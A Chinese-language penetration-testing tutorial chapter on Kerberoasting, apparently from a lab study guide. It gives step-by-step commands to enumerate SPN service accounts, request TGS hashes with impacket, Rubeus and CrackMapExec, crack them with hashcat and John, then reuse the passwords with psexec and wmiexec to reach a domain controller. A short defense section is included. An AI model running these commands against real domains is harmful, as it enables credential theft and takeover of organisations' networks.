# Ch 32 — Kerberoasting：服務票證離線破解

> 目標：用 Kerberoasting 取得服務帳號的 Kerberos 票據（TGS），並離線破解取得明文密碼。

## 原理

Kerberos Service Ticket（TGS）是用**服務帳號的 NTLM hash** 加密的。

如果你有任何有效的域帳號，就能請求任意服務的 TGS。取得 TGS 後，帶回來離線破解，就能拿到服務帳號的密碼。

```
你（有任意域帳號）→ DC：我要 SVC-SQL 服務的 TGS
DC → 你：這是 TGS（用 SVC-SQL 的 hash 加密）
你帶回 Kali → hashcat 離線破解 → 得到 SVC-SQL 的密碼
```

**服務帳號通常有弱密碼**（因為是服務設定的，人工設的），而且服務帳號往往有高權限。

## 找有 SPN 的服務帳號

SPN（Service Principal Name）是識別服務的字串，有 SPN 的帳號才能做 Kerberoasting。

```bash
# impacket GetUserSPNs.py
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    corp.local/alice:'Password123' \
    -dc-ip 10.10.10.x

# 輸出：
# ServicePrincipalName  Name     MemberOf                      PasswordLastSet  ...
# --------------------  -------  ----------------------------  ---------------
# MSSQLSvc/sql01:1433   svc-sql  Domain Admins                 2023-01-01
```

**重要**：`svc-sql` 是 Domain Admins 成員！破解它的密碼就能接管整個 Domain。

## 取得 TGS Hash

```bash
# 請求所有有 SPN 的帳號的 TGS（並輸出 hashcat 格式）
python3 GetUserSPNs.py \
    corp.local/alice:'Password123' \
    -dc-ip 10.10.10.x \
    -request \
    -outputfile kerberoast.txt

# kerberoast.txt 內容：
$krb5tgs$23$*svc-sql$CORP.LOCAL$corp.local/svc-sql*$1234ABCD...
```

### Rubeus（在 Windows 靶機上）

```cmd
# 先傳 Rubeus.exe 到靶機
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# 或指定特定帳號
.\Rubeus.exe kerberoast /user:svc-sql /format:hashcat /outfile:svc-sql.txt
```

### CrackMapExec

```bash
crackmapexec ldap 10.10.10.x -u alice -p 'Password123' --kerberoasting kerberoast.txt
```

## 破解 TGS Hash

```bash
# Hashcat（-m 13100 = krb5tgs）
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# 加規則（找更多變體）
hashcat -m 13100 kerberoast.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## 拿到密碼後怎麼辦

```bash
# 確認帳號有效
crackmapexec smb 10.10.10.x -u svc-sql -p 'ServicePassword1'

# 如果是 Domain Admin
# 直接 psexec 進 DC：
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
    corp.local/svc-sql:'ServicePassword1'@10.10.10.x

# 或 wmiexec
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
    corp.local/svc-sql:'ServicePassword1'@10.10.10.x

# 拿到 DC shell 後 DCSync（Ch 35）
```

## Targeted Kerberoasting（ACL 攻擊）

如果你有帳號的 GenericAll / GenericWrite 權限，可以給它加 SPN，然後 Kerberoast：

```powershell
# 加 SPN（需要 GenericWrite 對目標帳號）
Set-DomainObject -Credential $Cred -Identity targetuser -Set @{serviceprincipalname='fake/service'}

# Kerberoast
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -Expand Hash > hash.txt

# 破解後，移除 SPN
Set-DomainObject -Credential $Cred -Identity targetuser -Clear serviceprincipalname
```

## 為什麼 Kerberoasting 有效

1. 任何域帳號都能請求任意服務的 TGS（這是 Kerberos 的設計）
2. TGS 用服務帳號密碼 hash 加密
3. 服務帳號密碼往往不強（或很少更換）
4. 離線破解，不觸發任何鎖定

**防禦措施**：服務帳號用強密碼（25+ 字元隨機）、啟用 AES 加密（`msDS-SupportedEncryptionTypes`）、使用 gMSA（Group Managed Service Accounts）。

## 本章對應靶機

| 機器 | Kerberoasting 情況 |
|------|-----------------|
| HTB Active | GPP 密碼 → 有 Domain User → Kerberoast Administrator |
| HTB Forest | AS-REP 拿到 svc-alfresco → WriteDACL → 加自己進 DA |

Active 是 Kerberoasting 的經典練習機器。

## 自我檢核

- [ ] 能用 GetUserSPNs.py 取得所有服務帳號的 TGS
- [ ] 能用 hashcat -m 13100 破解 TGS hash
- [ ] 知道哪些服務帳號是高價值目標（Domain Admins 成員）
- [ ] 破解後能用 psexec.py 連接到目標機器

→ [Ch 33 BloodHound + SharpHound：攻擊路徑視覺化](./33-bloodhound.md)
